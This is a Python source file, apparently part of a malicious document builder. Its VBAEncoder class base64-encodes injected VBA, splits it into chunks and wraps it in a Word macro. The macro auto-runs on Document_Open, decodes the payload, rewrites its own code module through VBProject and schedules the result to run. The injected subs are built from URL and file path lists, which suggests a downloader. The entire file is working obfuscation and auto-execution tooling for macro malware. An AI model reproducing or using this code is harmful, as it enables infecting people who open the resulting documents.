from .original import OriginalBuilder
import base64
class VBAEncoder:
    def __init__(self):
        self.builder = OriginalBuilder()

    def encode_vba_to_base64(self,vba_code):
        encoded_bytes = base64.b64encode(vba_code.encode("utf-8"))
        return encoded_bytes.decode("utf-8")
    def split_encoded_base64(self,encoded_str, line_length=80, max_lines_per_part=20):
        chunks = [encoded_str[i:i+line_length] for i in range(0, len(encoded_str), line_length)]
        parts = []
        for i in range(0, len(chunks), max_lines_per_part):
            part_lines = chunks[i:i+max_lines_per_part]
            part = ""
            for j, line in enumerate(part_lines):
                if j == 0:
                    part += f'    part{i//max_lines_per_part + 1} = "{line}" & _\n'
                else:
                    part += f'         "{line}" & _\n'
            part = part.rstrip('& _\n')
            parts.append(part)
        return parts
    def generate_final_vba_code(self,parts):
        vba_header = '''Sub A()
End Sub
Sub B()
End Sub
Sub RunDecodedCode()
    A
    B
End Sub
Private Function DecodeBase64(ByVal base64Str As String) As String
    Dim objXML As Object, objNode As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = base64Str
    DecodeBase64 = StrConv(objNode.nodeTypedValue, vbUnicode)
End Function
Sub ExecuteDecodedCode()
    Dim encodedText As String
    '''
        vba_parts = '\n'.join(parts)
        part_names = [f'part{i+1}' for i in range(len(parts))]
        vba_encoded_text = f'    encodedText = ' + ' & '.join(part_names) + '\n'

        vba_footer = '''
    Dim decodedCode As String
    decodedCode = DecodeBase64(encodedText)
    Dim vbComp As Object
    Set vbComp = ThisDocument.VBProject.VBComponents("ThisDocument")
    Dim lineCount As Long
    lineCount = vbComp.CodeModule.CountOfLines
    Dim i As Long
    Dim startLine As Long
    For i = 1 To lineCount
        If InStr(1, vbComp.CodeModule.Lines(i, 1), "Sub A()") > 0 Then
            startLine = i
            Do While InStr(1, vbComp.CodeModule.Lines(i, 1), "End Sub") = 0
                i = i + 1
            Loop
            vbComp.CodeModule.DeleteLines startLine, i - startLine + 1
            Exit For
        End If
    Next i
    For i = 1 To lineCount
        If InStr(1, vbComp.CodeModule.Lines(i, 1), "Sub B()") > 0 Then
            startLine = i
            Do While InStr(1, vbComp.CodeModule.Lines(i, 1), "End Sub") = 0
                i = i + 1
            Loop
            vbComp.CodeModule.DeleteLines startLine, i - startLine + 1
            Exit For
        End If
    Next i
    vbComp.CodeModule.InsertLines 1, decodedCode 
End Sub
Private Sub Document_Open()
    ExecuteDecodedCode
    Application.OnTime Now + TimeValue("00:00:02"), "RunDecodedCode"
End Sub
    '''
        return vba_header + vba_parts + '\n' + vba_encoded_text + vba_footer

    def convert_vba_string(self,vba_inject):
        encoded_str = self.encode_vba_to_base64(vba_inject)
        parts = self.split_encoded_base64(encoded_str)
        vba_code = self.generate_final_vba_code(parts)
        return vba_code
    def generate_encoded_vba(self, url_list, path_list, main_file_path):
        sub_a = self.builder.build_sub_a(url_list, path_list)
        sub_b = self.builder.build_sub_b(main_file_path)
        vba_inject = sub_a + '\n' + sub_b
        final_vba = self.convert_vba_string(vba_inject)
        return final_vba

